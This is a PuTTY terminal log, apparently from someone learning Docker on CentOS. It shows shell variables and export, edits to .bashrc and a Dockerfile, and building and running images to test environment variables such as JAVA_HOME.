@@ -1,0 +1,1406 @@
+=~=~=~=~=~=~=~=~=~=~=~= PuTTY log 2017.09.17 09:06:11 =~=~=~=~=~=~=~=~=~=~=~=
+[K[root@docker ~]# df -hT
+Filesystem     Type      Size  Used Avail Use% Mounted on
+devtmpfs       devtmpfs  489M  156K  488M   1% /dev
+tmpfs          tmpfs     497M     0  497M   0% /dev/shm
+/dev/xvda1     ext4      7.8G  3.1G  4.7G  40% /
+overlay        overlay   7.8G  3.1G  4.7G  40% /var/lib/docker/overlay2/c14e14ca70d7c97d9cccc705f7a53f98677e3e3f7f12fbb584c9c30576e54a0f/merged
+shm            tmpfs      64M     0   64M   0% /var/lib/docker/containers/a60f1bb6981eb239707fabac0d14f73d94989f2e9d541843f7d4bb9e63e3755d/shm
+overlay        overlay   7.8G  3.1G  4.7G  40% /var/lib/docker/overlay2/58744576f62f863838fc2e6fb94bfdee7f0b5f396c1b6ff7d260cd4176ce376e/merged
+shm            tmpfs      64M     0   64M   0% /var/lib/docker/containers/ca7fd4236f6a3906673a2d9605c36977af511cc389ce4062420a748521892b54/shm
+overlay        overlay   7.8G  3.1G  4.7G  40% /var/lib/docker/overlay2/adbb6b1f3fa1574bad5146a14d06f7240421caa60589ba68b0d9fab3a26e4652/merged
+shm            tmpfs      64M     0   64M   0% /var/lib/docker/containers/c35d802124625b3f2caeb732726ad41926b2d13d0bfc0d24c9c0a226bfc62661/shm
+overlay        overlay   7.8G  3.1G  4.7G  40% /var/lib/docker/overlay2/9a93ad0e090b5699f5a2d6de210e683ca442201c5347b109f648351018a498e8/merged
+shm            tmpfs      64M     0   64M   0% /var/lib/docker/containers/477ec3b7f65b31043fa7d3a8ab79ed530bea4133a508382dfaabe80253d4db2f/shm
+overlay        overlay   7.8G  3.1G  4.7G  40% /var/lib/docker/overlay2/be4c8aefe29cd5b541f63d9ae2b6abc3031f099d939a4972414f310c3fbfdd04/merged
+shm            tmpfs      64M     0   64M   0% /var/lib/docker/containers/012ab3d2bfca4054e012a0fe49aeec15486643feac34307b891e6e41f8238b43/shm
+overlay        overlay   7.8G  3.1G  4.7G  40% /var/lib/docker/overlay2/01f26c49a68e8860a7fcf489e91c1cb70671a535dfd37d0fa7b2839e676fd32a/merged
+shm            tmpfs      64M     0   64M   0% /var/lib/docker/containers/b47c8936c814bd5559b03b9e2c412f79dfa7a3d29f6deb5e3ca8650a5c807d13/shm
+overlay        overlay   7.8G  3.1G  4.7G  40% /var/lib/docker/overlay2/dbe45e1f056534f8afd9afee62c9dba09806029d3c767c95c769e07cc4f123ab/merged
+shm            tmpfs      64M     0   64M   0% /var/lib/docker/containers/0bb0cb6bb94a293cde9eefa2821487630599dda86274bd5868c439e777f2db35/shm
+overlay        overlay   7.8G  3.1G  4.7G  40% /var/lib/docker/overlay2/1f035750482f91e4ce9803dab77f8ac16e7474a90f78a13cad61d9154777e38d/merged
+shm            tmpfs      64M     0   64M   0% /var/lib/docker/containers/cd549e64d7c2576786fc448bce727970ee611b9318be5a72ce96edf1d24a770a/shm
+overlay        overlay   7.8G  3.1G  4.7G  40% /var/lib/docker/overlay2/5ad2db1b67f83d412cf412d93aeb070c89eb743248a8455d47b24e0786d9851a/merged
+shm            tmpfs      64M     0   64M   0% /var/lib/docker/containers/b48b0ef02c25354fc0f99faf897f406f36a55825932a763e8b910851a54dcb15/shm
+overlay        overlay   7.8G  3.1G  4.7G  40% /var/lib/docker/overlay2/e14706ef3b3a60537eda27a0f6371a03e7440884bdffd9c85c0158b4afccc079/merged
+shm            tmpfs      64M     0   64M   0% /var/lib/docker/containers/745755edb7e9470756f6a6009f6b2a2fb22a63dd82ace126f6f0a92df133ff71/shm
+overlay        overlay   7.8G  3.1G  4.7G  40% /var/lib/docker/overlay2/be70f4e2a10a7f2c57cc3ba06f2f0a4a44b3cb3f965c8bf9c60deea05bff0f46/merged
+shm            tmpfs      64M     0   64M   0% /var/lib/docker/containers/c63f9a1e97322a75ef7a00ac8c82254c0467af9d8a7cb35a890efa9e86f3c44f/shm
+overlay        overlay   7.8G  3.1G  4.7G  40% /var/lib/docker/overlay2/47a868ad34db78f39f0c06d4bae32a8bfac2ffb89696da05b431b547ed100fb9/merged
+shm            tmpfs      64M     0   64M   0% /var/lib/docker/containers/87ac319e7836fa529cc2abf678215b2c9bb8c422565bf136ede5043ea88c5d42/shm
+overlay        overlay   7.8G  3.1G  4.7G  40% /var/lib/docker/overlay2/f44df3529875308cf633b2f37f387120d14f840db6cf7a39b733034a797fcd0e/merged
+shm            tmpfs      64M     0   64M   0% /var/lib/docker/containers/2d88c4260a54d8237548382ec8d5d45f46ae5919de0a037ac33eec33dbe69228/shm
+overlay        overlay   7.8G  3.1G  4.7G  40% /var/lib/docker/overlay2/561b2700d67c2f15677bc8ecec2b56f1de2eb2f1453485502404ae930d9b7ca4/merged
+shm            tmpfs      64M     0   64M   0% /var/lib/docker/containers/ec9a0f95b482b213310bda1d0ecd9c6146b95a44d9a56b283d310bf65b4d0b60/shm
+]0;root@docker:~[root@docker ~]# 
+]0;root@docker:~[root@docker ~]# 
+]0;root@docker:~[root@docker ~]# [H[2J[root@docker ~]# [H[2J[root@docker ~]# 
+]0;root@docker:~[root@docker ~]# 
+]0;root@docker:~[root@docker ~]# 
+]0;root@docker:~[root@docker ~]# [H[2J[root@docker ~]# val[K=[Kl=20
+]0;root@docker:~[root@docker ~]# echo $val
+20
+]0;root@docker:~[root@docker ~]# cat /etc/ss[Khells 
+/bin/sh
+/bin/bash
+/sbin/nologin
+/bin/dash
+]0;root@docker:~[root@docker ~]# sh
+[?1034hsh-4.2# echo $val
+
+sh-4.2# exit
+]0;root@docker:~[root@docker ~]# echo $val
+20
+]0;root@docker:~[root@docker ~]# export val=20
+]0;root@docker:~[root@docker ~]# echo $val
+20
+]0;root@docker:~[root@docker ~]# sh
+[?1034hsh-4.2# echo $val
+20
+sh-4.2# exit
+]0;root@docker:~[root@docker ~]# [H[2J[root@docker ~]# 
+]0;root@docker:~[root@docker ~]# 
+]0;root@docker:~[root@docker ~]# 
+]0;root@docker:~[root@docker ~]# vim ~/.,[K[K.bashrc
+[?1049h[?1h=[?2004h[2;1H▽[6n[2;1H  [1;1H]11;?[1;33r[?12;25h[?12l[?25h[27m[m[H[2J[?25l[33;1H"~/.bashrc" 12L, 176C[>c[1;1H[34m# .bashrc
+
+# User specific aliases and functions[m
+
+[33malias [m[36mrm[m[33m='[m[31mrm -i[m[33m'
+alias [m[36mcp[m[33m='[m[31mcp -i[m[33m'
+alias [m[36mmv[m[33m='[m[31mmv -i[m[33m'[m
+
+[34m# Source global definitions[m
+[33mif [[m [33m-f[m /etc/bashrc [33m];[m [33mthen
+        . [m/etc/bashrc
+[33mfi[m
+[1m[34m~                                                                                          [14;1H~                                                                                          [15;1H~                                                                                          [16;1H~                                                                                          [17;1H~                                                                                          [18;1H~                                                                                          [19;1H~                                                                                          [20;1H~                                                                                          [21;1H~                                                                                          [22;1H~                                                                                          [23;1H~                                                                                          [24;1H~                                                                                          [25;1H~                                                                                          [26;1H~                                                                                          [27;1H~                                                                                          [28;1H~                                                                                          [29;1H~                                                                                          [30;1H~                                                                                          [31;1H~                                                                                          [32;1H~                                                                                          [m[33;74H1,1[11CAll[1;1H[?12l[?25h[27m[m[H[2J[?25l[1;1H[34m# .bashrc
+
+# User specific aliases and functions[m
+
+[33malias [m[36mrm[m[33m='[m[31mrm -i[m[33m'
+alias [m[36mcp[m[33m='[m[31mcp -i[m[33m'
+alias [m[36mmv[m[33m='[m[31mmv -i[m[33m'[m
+
+[34m# Source global definitions[m
+[33mif [[m [33m-f[m /etc/bashrc [33m];[m [33mthen
+        . [m/etc/bashrc
+[33mfi[m
+[1m[34m~                                                                                          [14;1H~                                                                                          [15;1H~                                                                                          [16;1H~                                                                                          [17;1H~                                                                                          [18;1H~                                                                                          [19;1H~                                                                                          [20;1H~                                                                                          [21;1H~                                                                                          [22;1H~                                                                                          [23;1H~                                                                                          [24;1H~                                                                                          [25;1H~                                                                                          [26;1H~                                                                                          [27;1H~                                                                                          [28;1H~                                                                                          [29;1H~                                                                                          [30;1H~                                                                                          [31;1H~                                                                                          [32;1H~                                                                                          [m[33;74H1,1[11CAll"~/.bashrc" 12L, 176C[1;1H[?12l[?25h[?25l[33;75H2,1[12;1H[?12l[?25h[?25l[33;1H[1m-- INSERT --[m[33;13H[K[33;74H12,3[10CAll[12;3H[?12l[?25h[?25l[13;1H[K[33;75H3,1[13;1H[?12l[?25h[?25l[14;1H[K[33;75H4[14;1H[?12l[?25h[?25le[33;77H2[14;2H[?12l[?25h[?25lx[33;77H3[14;3H[?12l[?25h[?25lp[33;77H4[14;4H[?12l[?25h[?25lo[33;77H5[14;5H[?12l[?25h[?25lr[33;77H6[14;6H[?12l[?25h[?25lt[33;77H7[14;7H[?12l[?25h[?25l[33mexport[m[36m [m[33;77H8[14;8H[?12l[?25h[?25l[36mv[m[33;77H9[14;9H[?12l[?25h[?25l[36ma[m[33;77H10[14;10H[?12l[?25h[?25l[36ml[m[33;78H1[14;11H[?12l[?25h[?25l[36m=[m[33;78H2[14;12H[?12l[?25h[?25l[31m2[m[33;78H3[14;13H[?12l[?25h[?25l[31m0[m[33;78H4[14;14H[?12l[?25h[33;1H[K[14;13H[?25l[33;74H14,13[9CAll[14;13H[?12l[?25h[?25l[33;74H[K[33;1H:[?12l[?25hw[?25l[?12l[?25hq[?25l[?12l[?25h![?25l[?12l[?25h[?25l".bashrc" 14L, 191C written
+[?2004l[?1l>[?12l[?25h[?1049l]0;root@docker:~[root@docker ~]# 
+]0;root@docker:~[root@docker ~]# 
+]0;root@docker:~[root@docker ~]# [H[2J[root@docker ~]# 
+]0;root@docker:~[root@docker ~]# 
+]0;root@docker:~[root@docker ~]# 
+]0;root@docker:~[root@docker ~]# cd /tmp/Build/
+]0;root@docker:/tmp/Build[root@docker Build]# ls -l
+total 4
+-rw-r--r-- 1 root root 103 Sep 17 03:25 Dockerfile
+]0;root@docker:/tmp/Build[root@docker Build]# vim Dockerfile 
+[?1049h[?1h=[?2004h[2;1H▽[6n[2;1H  [1;1H]11;?[1;33r[?12;25h[?12l[?25h[27m[m[H[2J[?25l[33;1H"Dockerfile" 7L, 103C[>c[1;1H[34m# My image[m
+
+[33mFROM [mcentos:centos6
+[33mMAINTAINER [mshahan
+[33mRUN [museradd [33mtest
+USER [mtest
+[33mRUN [myum install telnet [35m-y[m
+[1m[34m~                                                                                          [9;1H~                                                                                          [10;1H~                                                                                          [11;1H~                                                                                          [12;1H~                                                                                          [13;1H~                                                                                          [14;1H~                                                                                          [15;1H~                                                                                          [16;1H~                                                                                          [17;1H~                                                                                          [18;1H~                                                                                          [19;1H~                                                                                          [20;1H~                                                                                          [21;1H~                                                                                          [22;1H~                                                                                          [23;1H~                                                                                          [24;1H~                                                                                          [25;1H~                                                                                          [26;1H~                                                                                          [27;1H~                                                                                          [28;1H~                                                                                          [29;1H~                                                                                          [30;1H~                                                                                          [31;1H~                                                                                          [32;1H~                                                                                          [m[33;74H5,1[11CAll[5;1H[?12l[?25h[27m[m[H[2J[?25l[1;1H[34m# My image[m
+
+[33mFROM [mcentos:centos6
+[33mMAINTAINER [mshahan
+[33mRUN [museradd [33mtest
+USER [mtest
+[33mRUN [myum install telnet [35m-y[m
+[1m[34m~                                                                                          [9;1H~                                                                                          [10;1H~                                                                                          [11;1H~                                                                                          [12;1H~                                                                                          [13;1H~                                                                                          [14;1H~                                                                                          [15;1H~                                                                                          [16;1H~                                                                                          [17;1H~                                                                                          [18;1H~                                                                                          [19;1H~                                                                                          [20;1H~                                                                                          [21;1H~                                                                                          [22;1H~                                                                                          [23;1H~                                                                                          [24;1H~                                                                                          [25;1H~                                                                                          [26;1H~                                                                                          [27;1H~                                                                                          [28;1H~                                                                                          [29;1H~                                                                                          [30;1H~                                                                                          [31;1H~                                                                                          [32;1H~                                                                                          [m[33;74H5,1[11CAll"Dockerfile" 7L, 103C[5;1H[?12l[?25h[?25l[33;74H6[6;1H[?12l[?25h[?25l[33;74H7[7;1H[?12l[?25h[?25l[33;74H6[6;1H[?12l[?25h[?25l[33;74H5[5;1H[?12l[?25h[?25l[5;32r[32;1H
+[1;33r[32;1H[1m[34m~                                                                                          [m[33;1H[K[33;74H5,1[11CAll[5;1H[?12l[?25h[?25l[5;32r[32;1H
+[1;33r[32;1H[1m[34m~                                                                                          [m[33;74H[K[33;74H5,1[11CAll[5;1H[?12l[?25h[?25l[1m[34m~                                                                                          [m[33;74H4[4;1H[?12l[?25h[?25l[33;1H[1m-- INSERT --[m[33;74H[K[33;74H4,18[10CAll[4;18H[?12l[?25h[?25l[5;1H[K[33;74H5,1 [5;1H[?12l[?25h[?25lR[33;76H2[5;2H[?12l[?25h[?25lU[33;76H3[5;3H[?12l[?25h[?25lN[33;76H4[5;4H[?12l[?25h[?25l[33mRUN [m[33;76H5[5;5H[?12l[?25h[?25le[33;76H6[5;6H[?12l[?25h[?25lc[33;76H7[5;7H[?12l[?25h[?25lh[33;76H8[5;8H[?12l[?25h[?25l[33mecho[m[33;76H9[5;9H[?12l[?25h[?25l[31m [m[33;76H10[5;10H[?12l[?25h[?25l[33m"[m[33;77H1[5;11H[?12l[?25h[?25l[31me[m[33;77H2[5;12H[?12l[?25h[?25l[31mx[m[33;77H3[5;13H[?12l[?25h[?25l[31mp[m[33;77H4[5;14H[?12l[?25h[?25l[31mo[m[33;77H5[5;15H[?12l[?25h[?25l[31mr[m[33;77H6[5;16H[?12l[?25h[?25l[31mt[m[33;77H7[5;17H[?12l[?25h[?25l[31m [m[33;77H8[5;18H[?12l[?25h[?25l[31mv[m[33;77H9[5;19H[?12l[?25h[?25l[31ma[m[33;76H20[5;20H[?12l[?25h[?25l[31ml[m[33;77H1[5;21H[?12l[?25h[?25l[31m=[m[33;77H2[5;22H[?12l[?25h[?25l[31m2[m[33;77H3[5;23H[?12l[?25h[?25l[31m0[m[33;77H4[5;24H[?12l[?25h[?25l[33m"[m[33;77H5[5;25H[?12l[?25h[?25l[31m [m[33;77H6[5;26H[?12l[?25h[?25l[33m>[m[33;77H7[5;27H[?12l[?25h[?25l[33m>[m[33;77H8[5;28H[?12l[?25h[?25l[33;77H9[5;29H[?12l[?25h[?25l~[33;76H30[5;30H[?12l[?25h[?25l/[33;77H1[5;31H[?12l[?25h[?25l.[33;77H2[5;32H[?12l[?25h[?25lb[33;77H3[5;33H[?12l[?25h[?25la[33;77H4[5;34H[?12l[?25h[?25ls[33;77H5[5;35H[?12l[?25h[?25lh[33;77H6[5;36H[?12l[?25h[?25lr[33;77H7[5;37H[?12l[?25h[?25lc[33;77H8[5;38H[?12l[?25h[33;1H[K[5;37H[?25l[33;74H5,37[10CAll[5;37H[?12l[?25h[?25l[33;74H[K[33;1H:[?12l[?25hw[?25l[?12l[?25hq[?25l[?12l[?25h![?25l[?12l[?25h[?25l"Dockerfile" 5L, 88C written
+[?2004l[?1l>[?12l[?25h[?1049l]0;root@docker:/tmp/Build[root@docker Build]# vim Dockerfile ^C
+]0;root@docker:/tmp/Build[root@docker Build]# [1@(reverse-i-search)`':[Cb': vim ~/.bashrcu': docker build -t "user:v2" .[1@i[C[C[C[C[C[C[C[C[C[C[1@l[C[C[C[C[C[C[C[C[C[C[5P[root@docker Build]#[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C^[[D[C[C[C[C[C[K[K[K[1P[1P[1P[1P[1@e[1@n[1@v[C[C[C[C[C[C[1P[1@1
+Sending build context to Docker daemon 2.048 kB
+Step 1/3 : FROM centos:centos6
+ ---> 5dedbd63518e
+Step 2/3 : MAINTAINER shahan
+ ---> Using cache
+ ---> 5afae0aa08e2
+Step 3/3 : RUN echo "export val=20" >> ~/.bashrc
+ ---> Running in fb09b9a056e7
+ ---> a99376cb34df
+Removing intermediate container fb09b9a056e7
+Successfully built a99376cb34df
+]0;root@docker:/tmp/Build[root@docker Build]# docker run -it env:v1 /bin/bash
+]0;@5638dd64284d:/[?1034h[root@5638dd64284d /]# 
+]0;@5638dd64284d:/[root@5638dd64284d /]# 
+]0;@5638dd64284d:/[root@5638dd64284d /]# echo $val
+20
+]0;@5638dd64284d:/[root@5638dd64284d /]# exit
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# [H[2J[root@docker Build]# vim Dockerfile 
+[?1049h[?1h=[?2004h[2;1H▽[6n[2;1H  [1;1H]11;?[1;33r[?12;25h[?12l[?25h[27m[m[H[2J[?25l[33;1H"Dockerfile" 5L, 88C[>c[1;1H[34m# My image[m
+
+[33mFROM [mcentos:centos6
+[33mMAINTAINER [mshahan
+[33mRUN echo[m[31m [m[33m"[m[31mexport val=20[m[33m"[m[31m [m[33m>>[m ~/.bashrc
+[1m[34m~                                                                                          [7;1H~                                                                                          [8;1H~                                                                                          [9;1H~                                                                                          [10;1H~                                                                                          [11;1H~                                                                                          [12;1H~                                                                                          [13;1H~                                                                                          [14;1H~                                                                                          [15;1H~                                                                                          [16;1H~                                                                                          [17;1H~                                                                                          [18;1H~                                                                                          [19;1H~                                                                                          [20;1H~                                                                                          [21;1H~                                                                                          [22;1H~                                                                                          [23;1H~                                                                                          [24;1H~                                                                                          [25;1H~                                                                                          [26;1H~                                                                                          [27;1H~                                                                                          [28;1H~                                                                                          [29;1H~                                                                                          [30;1H~                                                                                          [31;1H~                                                                                          [32;1H~                                                                                          [m[33;74H5,1[11CAll[5;1H[?12l[?25h[27m[m[H[2J[?25l[1;1H[34m# My image[m
+
+[33mFROM [mcentos:centos6
+[33mMAINTAINER [mshahan
+[33mRUN echo[m[31m [m[33m"[m[31mexport val=20[m[33m"[m[31m [m[33m>>[m ~/.bashrc
+[1m[34m~                                                                                          [7;1H~                                                                                          [8;1H~                                                                                          [9;1H~                                                                                          [10;1H~                                                                                          [11;1H~                                                                                          [12;1H~                                                                                          [13;1H~                                                                                          [14;1H~                                                                                          [15;1H~                                                                                          [16;1H~                                                                                          [17;1H~                                                                                          [18;1H~                                                                                          [19;1H~                                                                                          [20;1H~                                                                                          [21;1H~                                                                                          [22;1H~                                                                                          [23;1H~                                                                                          [24;1H~                                                                                          [25;1H~                                                                                          [26;1H~                                                                                          [27;1H~                                                                                          [28;1H~                                                                                          [29;1H~                                                                                          [30;1H~                                                                                          [31;1H~                                                                                          [32;1H~                                                                                          [m[33;74H5,1[11CAll"Dockerfile" 5L, 88C[5;1H[?12l[?25h[?25l[33;1H[K[33;1H:[?12l[?25hq[?25l[?12l[?25h![?25l[?12l[?25h[?25l[33;1H[K[33;1H[?2004l[?1l>[?12l[?25h[?1049l]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# vim Dockerfile docker run -it env:v1 /bin/bash^C
+]0;root@docker:/tmp/Build[root@docker Build]# docke rps
+-bash: docke: command not found
+]0;root@docker:/tmp/Build[root@docker Build]# docker ps
+CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
+ec9a0f95b482        user:v1             "/bin/bash"         22 minutes ago      Up 22 minutes                           unruffled_bhabha
+2d88c4260a54        testimage:v1        "/bin/bash"         38 minutes ago      Up 38 minutes                           myimage_test2
+87ac319e7836        myimage:v1          "/bin/bash"         49 minutes ago      Up 49 minutes                           myimage_test
+c63f9a1e9732        centos:centos6      "/bin/bash"         53 minutes ago      Up 53 minutes                           myimage
+745755edb7e9        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an hour                        test5
+b48b0ef02c25        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an hour                        test4
+cd549e64d7c2        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an hour                        test3
+0bb0cb6bb94a        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an hour                        test2
+b47c8936c814        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an hour                        test1
+012ab3d2bfca        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an hour                        server4
+477ec3b7f65b        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an hour                        server3
+c35d80212462        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an hour                        server2
+ca7fd4236f6a        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an hour                        server1
+a60f1bb6981e        ubuntu:xenial       "/bin/bash"         24 hours ago        Up About an hour                        gifted_wescoff
+]0;root@docker:/tmp/Build[root@docker Build]# docker ps -a
+CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                      PORTS               NAMES
+5638dd64284d        env:v1              "/bin/bash"              52 seconds ago      Exited (0) 26 seconds ago                       mystifying_ardinghelli
+dec501eb92d7        03f86e0fe8b7        "/bin/sh -c 'yum i..."   17 minutes ago      Exited (1) 17 minutes ago                       kickass_murdock
+ec9a0f95b482        user:v1             "/bin/bash"              22 minutes ago      Up 22 minutes                                   unruffled_bhabha
+2d88c4260a54        testimage:v1        "/bin/bash"              38 minutes ago      Up 38 minutes                                   myimage_test2
+aa257cc33922        5afae0aa08e2        "/bin/sh -c 'yum u..."   39 minutes ago      Exited (1) 39 minutes ago                       jolly_borg
+c71ae0a635c9        5afae0aa08e2        "/bin/sh -c 'yum u..."   40 minutes ago      Exited (1) 40 minutes ago                       agitated_curie
+87ac319e7836        myimage:v1          "/bin/bash"              49 minutes ago      Up 49 minutes                                   myimage_test
+7c653431c05d        centos:centos6      "/bin/bash"              51 minutes ago      Exited (1) 51 minutes ago                       test
+c63f9a1e9732        centos:centos6      "/bin/bash"              53 minutes ago      Up 53 minutes                                   myimage
+745755edb7e9        ubuntu:xenial       "/bin/bash"              About an hour ago   Up About an hour                                test5
+b48b0ef02c25        ubuntu:xenial       "/bin/bash"              About an hour ago   Up About an hour                                test4
+cd549e64d7c2        ubuntu:xenial       "/bin/bash"              About an hour ago   Up About an hour                                test3
+0bb0cb6bb94a        ubuntu:xenial       "/bin/bash"              About an hour ago   Up About an hour                                test2
+b47c8936c814        ubuntu:xenial       "/bin/bash"              About an hour ago   Up About an hour                                test1
+012ab3d2bfca        ubuntu:xenial       "/bin/bash"              About an hour ago   Up About an hour                                server4
+477ec3b7f65b        ubuntu:xenial       "/bin/bash"              About an hour ago   Up About an hour                                server3
+c35d80212462        ubuntu:xenial       "/bin/bash"              About an hour ago   Up About an hour                                server2
+ca7fd4236f6a        ubuntu:xenial       "/bin/bash"              About an hour ago   Up About an hour                                server1
+a60f1bb6981e        ubuntu:xenial       "/bin/bash"              24 hours ago        Up About an hour                                gifted_wescoff
+]0;root@docker:/tmp/Build[root@docker Build]# docker stat[Krt +[K5638dd64284d
+5638dd64284d
+]0;root@docker:/tmp/Build[root@docker Build]# docker attach 5638dd64284d
+[K[root@5638dd64284d /]# [K[root@5638dd64284d /]# 
+]0;@5638dd64284d:/[root@5638dd64284d /]# 
+]0;@5638dd64284d:/[root@5638dd64284d /]# env|grep -i val
+val=20
+]0;@5638dd64284d:/[root@5638dd64284d /]# vim Do
+bash: vim: command not found
+]0;@5638dd64284d:/[root@5638dd64284d /]# exit
+]0;root@docker:/tmp/Build[root@docker Build]# r[Kvim Dockerfile 
+[?1049h[?1h=[?2004h[2;1H▽[6n[2;1H  [1;1H]11;?[1;33r[?12;25h[?12l[?25h[27m[m[H[2J[?25l[33;1H"Dockerfile" 5L, 88C[>c[1;1H[34m# My image[m
+
+[33mFROM [mcentos:centos6
+[33mMAINTAINER [mshahan
+[33mRUN echo[m[31m [m[33m"[m[31mexport val=20[m[33m"[m[31m [m[33m>>[m ~/.bashrc
+[1m[34m~                                                                                          [7;1H~                                                                                          [8;1H~                                                                                          [9;1H~                                                                                          [10;1H~                                                                                          [11;1H~                                                                                          [12;1H~                                                                                          [13;1H~                                                                                          [14;1H~                                                                                          [15;1H~                                                                                          [16;1H~                                                                                          [17;1H~                                                                                          [18;1H~                                                                                          [19;1H~                                                                                          [20;1H~                                                                                          [21;1H~                                                                                          [22;1H~                                                                                          [23;1H~                                                                                          [24;1H~                                                                                          [25;1H~                                                                                          [26;1H~                                                                                          [27;1H~                                                                                          [28;1H~                                                                                          [29;1H~                                                                                          [30;1H~                                                                                          [31;1H~                                                                                          [32;1H~                                                                                          [m[33;74H5,1[11CAll[5;1H[?12l[?25h[27m[m[H[2J[?25l[1;1H[34m# My image[m
+
+[33mFROM [mcentos:centos6
+[33mMAINTAINER [mshahan
+[33mRUN echo[m[31m [m[33m"[m[31mexport val=20[m[33m"[m[31m [m[33m>>[m ~/.bashrc
+[1m[34m~                                                                                          [7;1H~                                                                                          [8;1H~                                                                                          [9;1H~                                                                                          [10;1H~                                                                                          [11;1H~                                                                                          [12;1H~                                                                                          [13;1H~                                                                                          [14;1H~                                                                                          [15;1H~                                                                                          [16;1H~                                                                                          [17;1H~                                                                                          [18;1H~                                                                                          [19;1H~                                                                                          [20;1H~                                                                                          [21;1H~                                                                                          [22;1H~                                                                                          [23;1H~                                                                                          [24;1H~                                                                                          [25;1H~                                                                                          [26;1H~                                                                                          [27;1H~                                                                                          [28;1H~                                                                                          [29;1H~                                                                                          [30;1H~                                                                                          [31;1H~                                                                                          [32;1H~                                                                                          [m[33;74H5,1[11CAll"Dockerfile" 5L, 88C[5;1H[?12l[?25h[?25l[1m[34m~                                                                                          [m[33;74H4[4;1H[?12l[?25h[?25l[33;1H[1m-- INSERT --[m[33;14H[K[33;74H4,18[10CAll[4;18H[?12l[?25h[?25l[5;1H[K[33;74H5,1 [5;1H[?12l[?25h[?25lE[33;76H2[5;2H[?12l[?25h[?25lN[33;76H3[5;3H[?12l[?25h[?25lV[33;76H4[5;4H[?12l[?25h[?25l[33mENV [m[33;76H5[5;5H[?12l[?25h[?25lj[33;76H6[5;6H[?12l[?25h[?25la[33;76H7[5;7H[?12l[?25h[?25lv[33;76H8[5;8H[?12l[?25h[?25la[33;76H9[5;9H[?12l[?25h[?25l[5;8H[K[33;76H8[5;8H[?12l[?25h[?25l[5;7H[K[33;76H7[5;7H[?12l[?25h[?25l[5;6H[K[33;76H6[5;6H[?12l[?25h[?25l[5;5H[K[33;76H5[5;5H[?12l[?25h[?25lJ[33;76H6[5;6H[?12l[?25h[?25lA[33;76H7[5;7H[?12l[?25h[?25lV[33;76H8[5;8H[?12l[?25h[?25lA[33;76H9[5;9H[?12l[?25h[?25l_[33;76H10[5;10H[?12l[?25h[?25lH[33;77H1[5;11H[?12l[?25h[?25lO[33;77H2[5;12H[?12l[?25h[?25lM[33;77H3[5;13H[?12l[?25h[?25lE[33;77H4[5;14H[?12l[?25h[?25l[33;77H5[5;15H[?12l[?25h[?25l/[33;77H6[5;16H[?12l[?25h[?25lu[33;77H7[5;17H[?12l[?25h[?25ls[33;77H8[5;18H[?12l[?25h[?25lr[33;77H9[5;19H[?12l[?25h[?25l/[33;76H20[5;20H[?12l[?25h[?25lb[33;77H1[5;21H[?12l[?25h[?25li[33;77H2[5;22H[?12l[?25h[?25ln[33;77H3[5;23H[?12l[?25h[?25l.[33;77H4[5;24H[?12l[?25h[?25l[5;23H[K[33;77H3[5;23H[?12l[?25h[?25l/[33;77H4[5;24H[?12l[?25h[?25lj[33;77H5[5;25H[?12l[?25h[?25la[33;77H6[5;26H[?12l[?25h[?25lv[33;77H7[5;27H[?12l[?25h[?25la[33;77H8[5;28H[?12l[?25h[33;1H[K[5;27H[?25l[33;74H5,27[10CAll[5;27H[?12l[?25h[?25l[33;74H[K[33;1H:[?12l[?25hw[?25l[?12l[?25hq[?25l[?12l[?25h![?25l[?12l[?25h[?25l"Dockerfile" 5L, 78C written
+[?2004l[?1l>[?12l[?25h[?1049l]0;root@docker:/tmp/Build[root@docker Build]# [1@(reverse-i-search)`':[Cb': docker run -it env:v1 /bin/bash[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[4Pu': docker build -t "env:v1" .[1@i[C[C[C[C[C[C[C[C[C[C[4P[root@docker Build]#[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1P[1@2
+Sending build context to Docker daemon 2.048 kB
+Step 1/3 : FROM centos:centos6
+ ---> 5dedbd63518e
+Step 2/3 : MAINTAINER shahan
+ ---> Using cache
+ ---> 5afae0aa08e2
+Step 3/3 : ENV JAVA_HOME /usr/bin/java
+ ---> Running in 9475615a0010
+ ---> 0cc573b42ff1
+Removing intermediate container 9475615a0010
+Successfully built 0cc573b42ff1
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# [1@(reverse-i-search)`':[Cr': docker build -t "env:v2" .u': docker run -it env:v1 /bin/bash[1@n[C[C[C[C[C[C[C[C[C[C[4P[root@docker Build]#[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1P /bin/bash2 /bin/bash
+]0;@da34b62f6722:/[?1034h[root@da34b62f6722 /]# [K[root@da34b62f6722 /]# 
+]0;@da34b62f6722:/[root@da34b62f6722 /]# 
+]0;@da34b62f6722:/[root@da34b62f6722 /]# 
+]0;@da34b62f6722:/[root@da34b62f6722 /]# env|grep -i JAVA
+JAVA_HOME=/usr/bin/java
+]0;@da34b62f6722:/[root@da34b62f6722 /]# ]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# 
